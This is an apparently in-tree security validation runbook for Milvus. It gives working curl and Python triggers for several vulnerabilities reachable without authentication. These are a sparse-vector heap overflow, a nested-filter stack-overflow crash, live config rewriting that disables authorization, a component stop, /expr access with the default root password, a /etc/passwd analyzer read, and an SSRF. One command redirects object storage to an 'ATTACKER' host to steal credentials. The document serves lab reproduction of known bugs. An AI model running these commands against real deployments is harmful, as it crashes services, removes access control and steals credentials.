# End-user triggers (curl / HTTP / minimal client)

Assumption: a stock standalone deploy like `deployments/docker/standalone/docker-compose.yml`:

- **`:19530`** — SDK gRPC + high-level REST (`/v2/vectordb/...`) via cmux
- **`:9091`** — metrics / management / WebUI / pprof (no app auth)
- **`authorizationEnabled=false`** (default) — no `Authorization` header needed on `:19530`
- Default root password **`Milvus`** (only needed for `/expr`)

Replace `HOST` with your Milvus host (`127.0.0.1` if local).

These steps are for **lab validation** of bugs already analyzed in-tree. They do not require compiling Milvus.

---

## 0. Sanity: REST is up

```bash
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/list" \
  -H 'Content-Type: application/json' -d '{}'
# expect JSON with "code":0
```

```bash
curl -s "http://HOST:9091/healthz"
```

---

## 1. Sparse search heap overflow (primary interest)

### Can a plain JSON `curl` hit it?

**No.** The REST search path always builds sparse rows through `CreateSparseFloatRowFromJSON` / `FromMap`, which emit lengths that are multiples of 8. That path never feeds a `len%8!=0` blob into segcore.

The overflow needs a **Search whose `PlaceholderGroup` already contains raw sparse bytes with `len % 8 != 0`**. That is what gRPC clients send on the wire. So:

| Path | Triggers overflow? |
|------|--------------------|
| `POST /v2/vectordb/entities/search` with JSON `{"1":0.1,...}` | No (server re-encodes) |
| gRPC `MilvusService/Search` with crafted `PlaceholderGroup` | **Yes** |

You still use **curl for setup**; the trigger is a tiny Python script (`pip install pymilvus` — no Milvus compile).

### 1a. Setup with curl (valid data only)

Quick-create with only `vectorFieldType` works on newer builds. If you get
`dimension is required for quickly create collection(... COSINE)` with
`actual=collectionName`, your image is treating the request as dense FloatVector
(likely older REST that ignores `vectorFieldType`). Use the **explicit schema** form instead:

```bash
# Create a sparse collection (explicit schema — portable across versions)
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/create" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "sparse_lab",
    "schema": {
      "autoID": false,
      "fields": [
        {
          "fieldName": "id",
          "dataType": "Int64",
          "isPrimary": true
        },
        {
          "fieldName": "vector",
          "dataType": "SparseFloatVector"
        }
      ]
    },
    "indexParams": [
      {
        "fieldName": "vector",
        "indexName": "vector",
        "metricType": "IP",
        "indexType": "SPARSE_INVERTED_INDEX"
      }
    ]
  }' | jq

# Optional newer quick-create (omit dimension; do NOT send dimension for sparse):
# curl ... -d '{"collectionName":"sparse_lab","vectorFieldType":"SparseFloatVector","metricType":"IP"}'
```

Then insert / load:

```bash
# Insert one valid sparse row (JSON map → server builds 8-aligned bytes)
curl -s -X POST "http://HOST:19530/v2/vectordb/entities/insert" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "sparse_lab",
    "data": [
      {"id": 1, "vector": {"1": 0.5, "10": 0.25}}
    ]
  }' | jq

# Load
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/load" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName": "sparse_lab"}' | jq
```

Wait until load completes:

```bash
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/get_load_state" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName": "sparse_lab"}'
```

### 1b. Trigger with crafted gRPC Search (invalid sparse length)

```bash
pip install -q pymilvus
python3 docs/security/validation/harness/sparse_search_trigger.py --host HOST --port 19530 \
  --collection sparse_lab --anns-field vector
```

What the script does: builds a `PlaceholderGroup` whose sparse value is **71 bytes** (`8*8+7`), type `SparseFloatVector`, and calls `Search`. That is the shape that reaches `CopyAndWrapSparseRow` → memcpy before `size%8==0`.

**What you should see (bug present):**

- RPC often returns a **parameter / plan error** (segcore asserts *after* the overflow and the cgo layer turns that into an error), **and/or**
- Under an ASAN-instrumented querynode/standalone: `heap-buffer-overflow` in `CopyAndWrapSparseRow` / `memcpy`
- Without ASAN: no guaranteed instant crash (overflow is only 1–7 bytes); repeated calls increase chance of later instability

**What “fixed” looks like:** reject before copy (clean parameter error, no ASAN hit).

### 1c. Why REST alone is insufficient (for reviewers)

REST search → `serializeSparseFloatVectors` → `CreateSparseFloatRowFromJSON` → always `len % 8 == 0` before placeholders are marshaled. The proxy then pass-throughs that already-valid blob. The missing proxy check only matters for clients that can supply **raw** placeholder bytes (gRPC).

---

## 2. Filter-expression stack-overflow DoS (curl)

Pre-auth at defaults. Any Query/Search/Delete whose `filter` is deeply nested parentheses (or a long run of `not`) can fatal-crash the process.

### Setup

```bash
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/create" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "dos_lab",
    "dimension": 4,
    "metricType": "L2"
  }'

curl -s -X POST "http://HOST:19530/v2/vectordb/entities/insert" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "dos_lab",
    "data": [{"id": 1, "vector": [0.1, 0.2, 0.3, 0.4]}]
  }'

curl -s -X POST "http://HOST:19530/v2/vectordb/collections/load" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName": "dos_lab"}'
```

### Trigger (generate nesting, then curl)

Depth **≥ ~50000** nested `(…)` reliably aborts the process in lab runs (`fatal error: stack overflow`). Do not paste that by hand — generate it:

```bash
python3 - <<'PY' > /tmp/dos_query.json
import json
depth = 50000
filt = "(" * depth + "id > 0" + ")" * depth
print(json.dumps({
  "collectionName": "dos_lab",
  "filter": filt,
  "outputFields": ["id"],
  "limit": 1
}))
PY

curl -s -X POST "http://HOST:19530/v2/vectordb/entities/query" \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/dos_query.json
```

**Pass criteria:** curl hangs/resets; `docker logs milvus-standalone` (or proxy log) shows:

```text
fatal error: stack overflow
... planparserv2/generated.(*PlanParser).expr ...
```

Control (should **not** crash):

```bash
curl -s -X POST "http://HOST:19530/v2/vectordb/entities/query" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName":"dos_lab","filter":"id > 0","limit":1,"outputFields":["id"]}'
```

Same idea works with Search if you add a normal `data` vector and put the nested string in `filter`.

---

## 3. Unauthenticated management on `:9091` (curl)

No credentials. Destructive — lab only.

### Rewrite config (auth bypass / enable expr / MinIO redirect)

```bash
# Disable authorization live (even if an operator had turned it on)
curl -s -X POST "http://HOST:9091/management/config/alter" \
  -H 'Content-Type: application/json' \
  -d '{"configs":[{"key":"common.security.authorizationEnabled","value":"false"}]}'

# Enable /expr (still needs root password to *call* /expr)
curl -s -X POST "http://HOST:9091/management/config/alter" \
  -H 'Content-Type: application/json' \
  -d '{"configs":[{"key":"common.security.exprEnabled","value":"true"}]}'

# Point object storage at an attacker-controlled endpoint (credential theft on next storage use)
curl -s -X POST "http://HOST:9091/management/config/alter" \
  -H 'Content-Type: application/json' \
  -d '{"configs":[{"key":"minio.address","value":"ATTACKER:9000"}]}'
```

Expect `{"msg":"OK"}`. Changes propagate via etcd within a few seconds.

### Stop component (DoS)

```bash
curl -s "http://HOST:9091/management/stop?role=proxy"
# or role=standalone / querynode / etc. depending on deploy
```

### pprof (info leak / CPU DoS)

```bash
curl -s "http://HOST:9091/debug/pprof/cmdline"
curl -s "http://HOST:9091/debug/pprof/heap" -o /tmp/heap.pprof
```

---

## 4. `/expr` in-process execution (curl, after enabling)

Requires step 3 enabling `exprEnabled`, plus default (or known) root password.

```bash
# Wait ~5s after config alter, then:
curl -s -G "http://HOST:9091/expr" \
  --data-urlencode 'code=param.CommonCfg.AuthorizationEnabled.GetValue()' \
  -u 'root:Milvus'
```

**Pass criteria:** JSON `{"output":"..."}` instead of 403 “expr endpoint is disabled”.  
This is **in-process method/field access**, not an OS shell.

---

## 5. Other curl-reachable surfaces (short)

### Analyzer local-path open (LFI-style)

Create a collection whose VARCHAR analyzer uses `type=local` and an absolute `path`. The querynode opens that path when validating/building the analyzer (auth off ⇒ anyone).

```bash
curl -s -X POST "http://HOST:19530/v2/vectordb/collections/create" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "lfi_lab",
    "schema": {
      "fields": [
        {"fieldName": "id", "dataType": "Int64", "isPrimary": true},
        {"fieldName": "vector", "dataType": "FloatVector", "elementTypeParams": {"dim": "4"}},
        {
          "fieldName": "text",
          "dataType": "VarChar",
          "elementTypeParams": {
            "max_length": "256",
            "enable_analyzer": true,
            "analyzer_params": {
              "tokenizer": "standard",
              "filter": [{"type": "stop", "stop_words": {"type": "local", "path": "/etc/passwd"}}]
            }
          }
        }
      ]
    }
  }'
```

Exact analyzer JSON shape can vary by version; if create fails validation, adjust using Describe/error text. **Pass criteria:** create/validate fails with a filesystem error mentioning the path, or succeeds after opening it (check querynode logs). This is file **open/read into tokenizer state**, not a clean “cat file back to HTTP response”.

### Model-function SSRF

Create/alter a collection with a `TextEmbedding` function whose `url` / `endpoint` is `http://ATTACKER/...`. On insert/search Milvus POSTs there (`http.DefaultClient`, follows redirects). Needs the provider enabled in config. Auth off ⇒ any client who can create collections.

### Import path issues

`POST /v2/vectordb/jobs/import` with crafted `files` paths. Meaningful mainly for `storageType: local` (local file read) or cross-object reads in a shared bucket. Prefer reading the import runbook in prior analysis before treating as a universal RCE.

---

## Quick matrix

| Bug | End-user tool | Port | Auth at defaults |
|-----|---------------|------|------------------|
| Sparse heap overflow | curl setup + **Python gRPC** trigger | 19530 | None |
| Filter stack DoS | **curl** only | 19530 | None |
| `config/alter`, stop, pprof | **curl** only | 9091 | None |
| `/expr` | **curl** + Basic `root:Milvus` | 9091 | Root password (default `Milvus`) |
| Analyzer path open / model SSRF / import | **curl** | 19530 | None |

---

## Related files

- Lab unit/ASAN notes: `sparse_search_heap_overflow.md`, `filter_expr_stack_overflow_dos.md`
- Sparse gRPC trigger: `harness/sparse_search_trigger.py`
- Sparse memcpy canary (no server): `harness/sparse_canary.cpp`
